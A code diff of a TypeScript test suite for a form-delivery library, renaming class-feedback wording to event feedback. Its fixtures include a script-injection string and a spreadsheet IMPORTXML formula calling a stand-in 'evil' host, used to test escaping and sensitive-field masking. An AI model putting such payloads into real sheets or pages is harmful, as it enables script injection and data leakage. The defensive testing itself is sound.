@@ -37,15 +37,15 @@ import {
 
 const form = defineForm({
   id: "feedback",
-  title: "Class feedback",
-  hidden: { coach: f.hidden.string({ source: "server" }), member: f.hidden.string({ source: "server", identifying: true }) },
+  title: "Event feedback",
+  hidden: { owner: f.hidden.string({ source: "server" }), member: f.hidden.string({ source: "server", identifying: true }) },
   blocks: [
-    f.rating("overall", { label: "How was class?", max: 5, required: true }),
+    f.rating("overall", { label: "How was the event?", max: 5, required: true }),
     f.multiChoice("went_well", {
       label: "What went well?",
-      options: [{ value: "coaching", label: "Coaching" }, { value: "workout", label: "The workout" }],
+      options: [{ value: "hosting", label: "Hosting" }, { value: "content", label: "The content" }],
     }),
-    f.longText("improve", { label: "Anything {{hidden:coach|we}} could do better?" }),
+    f.longText("improve", { label: "Anything {{hidden:owner|we}} could do better?" }),
     f.yesNo("contact_me", { label: "Want a follow-up?" }),
     f.email("email", { label: "Your email", identifying: true }),
     f.shortText("ssn", { label: "Secret", sensitive: true }),
@@ -60,15 +60,15 @@ const submission: DeliverySubmission = {
   id: "resp-1",
   answers: {
     overall: 4,
-    went_well: ["coaching", "workout"],
+    went_well: ["hosting", "content"],
     improve: "<script>alert(1)</script> & more",
     contact_me: true,
     email: "ada@example.com",
     ssn: "123-45-6789",
   },
-  context: { coach: "Sam" },
+  context: { owner: "Sam" },
   submittedAt: "2026-10-22",
-  meta: { form_version: 3, class: "06:00" },
+  meta: { form_version: 3, session: "06:00" },
 };
 
 interface Call {
@@ -149,13 +149,13 @@ describe("retry classification", () => {
 describe("responseRow", () => {
   it("lays out id, submitted_at, meta, then each field by key, with readable cells", () => {
     const { row, columns, labels } = responseRow(submission, def);
-    expect(columns).toEqual(["id", "submitted_at", "form_version", "class", "overall", "went_well", "improve", "contact_me", "email", "ssn"]);
+    expect(columns).toEqual(["id", "submitted_at", "form_version", "session", "overall", "went_well", "improve", "contact_me", "email", "ssn"]);
     expect(row).toMatchObject({
       id: "resp-1",
       submitted_at: "2026-10-22",
       form_version: 3,
       overall: 4,
-      went_well: "Coaching, The workout",
+      went_well: "Hosting, The content",
       contact_me: "Yes",
       email: "ada@example.com",
     });
@@ -223,7 +223,7 @@ describe("escapeFormula", () => {
     expect(escapeFormula("-2.5")).toBe("-2.5");
     expect(escapeFormula(-3)).toBe(-3);
     expect(escapeFormula(true)).toBe(true);
-    expect(escapeFormula("Great class = fun")).toBe("Great class = fun");
+    expect(escapeFormula("Great event = fun")).toBe("Great event = fun");
     expect(escapeFormula("")).toBe("");
   });
 });
@@ -248,11 +248,11 @@ describe("emailDestination", () => {
     const result = await email.deliver(submission, def, { to: ["owner@example.com"] });
     expect(result).toEqual({ ok: true });
     const message = sent[0]!;
-    expect(message.subject).toBe("Class feedback: new response");
+    expect(message.subject).toBe("Event feedback: new response");
     expect(message.html).toContain("&lt;script&gt;alert(1)&lt;/script&gt; &amp; more");
     expect(message.html).not.toContain("<script>");
     expect(message.text).toContain("Anything Sam could do better?: <script>alert(1)</script> & more");
-    expect(message.text).toContain("What went well?: Coaching, The workout");
+    expect(message.text).toContain("What went well?: Hosting, The content");
     expect(message.text).toContain("Secret: [sensitive]");
     expect(message.text).not.toContain("123-45-6789");
     expect(message.html).not.toContain("123-45-6789");
@@ -340,7 +340,7 @@ describe("resendProvider", () => {
     expect(headersOf(call).get("authorization")).toBe("Bearer re_SECRET_KEY");
     expect(headersOf(call).get("idempotency-key")).toMatch(/^del-9:[0-9a-f]{16}$/);
     const body = JSON.parse(call.body) as Record<string, unknown>;
-    expect(body).toMatchObject({ from: "forms@example.com", to: ["owner@example.com"], subject: "Class feedback: new response" });
+    expect(body).toMatchObject({ from: "forms@example.com", to: ["owner@example.com"], subject: "Event feedback: new response" });
     expect(typeof body["html"]).toBe("string");
     expect(typeof body["text"]).toBe("string");
     expect(call.init.signal).toBeInstanceOf(AbortSignal);
@@ -511,14 +511,14 @@ describe("sheetsDestination", () => {
     const evil = { ...submission, answers: { ...submission.answers, improve: "=IMPORTXML(\"http://evil\",\"//a\")" } };
     const result = await sheet.deliver(evil, def, config);
     expect(result.ok).toBe(true);
-    expect(google.header()).toEqual(["id", "submitted_at", "form_version", "class", "overall", "went_well", "improve", "contact_me", "email", "ssn"]);
+    expect(google.header()).toEqual(["id", "submitted_at", "form_version", "session", "overall", "went_well", "improve", "contact_me", "email", "ssn"]);
     expect(google.appended[0]).toEqual([
       "resp-1",
       "2026-10-22",
       3,
       "06:00",
       4,
-      "Coaching, The workout",
+      "Hosting, The content",
       "=IMPORTXML(\"http://evil\",\"//a\")",
       "Yes",
       "ada@example.com",
@@ -541,17 +541,17 @@ describe("sheetsDestination", () => {
       title: "At",
       blocks: [f.longText("@note", { label: "Note" }), f.longText("plain", { label: "Plain" })],
     }).definition;
-    const answers = { "@note": "@coach thanks", plain: "=1+1" };
+    const answers = { "@note": "@team thanks", plain: "=1+1" };
     const plain = fakeGoogle();
     await sheetsDestination({ account, fetch: plain.fetch }).deliver({ id: "r", answers }, withAt, config);
     expect(plain.header()).toEqual(["id", "@note", "plain"]);
-    expect(plain.appended[0]).toEqual(["r", "@coach thanks", "=1+1"]);
+    expect(plain.appended[0]).toEqual(["r", "@team thanks", "=1+1"]);
 
     clearGoogleTokenCache();
     const escaped = fakeGoogle();
     await sheetsDestination({ account, fetch: escaped.fetch, escapeFormulas: true }).deliver({ id: "r", answers }, withAt, config);
     expect(escaped.header()).toEqual(["id", "'@note", "plain"]);
-    expect(escaped.appended[0]).toEqual(["r", "'@coach thanks", "'=1+1"]);
+    expect(escaped.appended[0]).toEqual(["r", "'@team thanks", "'=1+1"]);
   });
 
   it("makes one request (the append) once the state is cached, and reuses the token", async () => {
@@ -637,7 +637,7 @@ describe("sheetsDestination", () => {
       spreadsheet_id: "sheet_ABCDEFGHIJ",
       sheet_name: "Responses",
       sheet_id: 7,
-      header: ["id", "submitted_at", "form_version", "class", "overall", "went_well", "improve", "contact_me", "email", "ssn"],
+      header: ["id", "submitted_at", "form_version", "session", "overall", "went_well", "improve", "contact_me", "email", "ssn"],
       columns: 26,
       last_row: 5,
     };
@@ -695,8 +695,8 @@ describe("webhookDestination", () => {
 
     const payload = JSON.parse(call.body) as { type: string; data: { submission: { answers: Record<string, unknown> }; row: Record<string, unknown> } };
     expect(payload.type).toBe("form.submitted");
-    expect(payload.data.submission.answers["went_well"]).toEqual(["coaching", "workout"]);
-    expect(payload.data.row["went_well"]).toBe("Coaching, The workout");
+    expect(payload.data.submission.answers["went_well"]).toEqual(["hosting", "content"]);
+    expect(payload.data.row["went_well"]).toBe("Hosting, The content");
   });
 
   it("matches the Standard Webhooks reference signature", async () => {
@@ -817,11 +817,11 @@ describe("webhookDestination", () => {
     const withSecret = defineForm({
       id: "s",
       title: "S",
-      hidden: { token: f.hidden.string({ source: "server", sensitive: true }), coach: f.hidden.string({ source: "server" }) },
+      hidden: { token: f.hidden.string({ source: "server", sensitive: true }), owner: f.hidden.string({ source: "server" }) },
       blocks: [f.shortText("ssn", { label: "SSN", sensitive: true })],
     }).definition;
     await webhookDestination({ secret, fetch: masked.fetch, sensitive: "mask" }).deliver(
-      { id: "r", answers: { ssn: "123-45-6789" }, context: { token: "tok_SECRET", coach: "Sam" } },
+      { id: "r", answers: { ssn: "123-45-6789" }, context: { token: "tok_SECRET", owner: "Sam" } },
       withSecret,
       { url: "https://hooks.example.com" },
     );
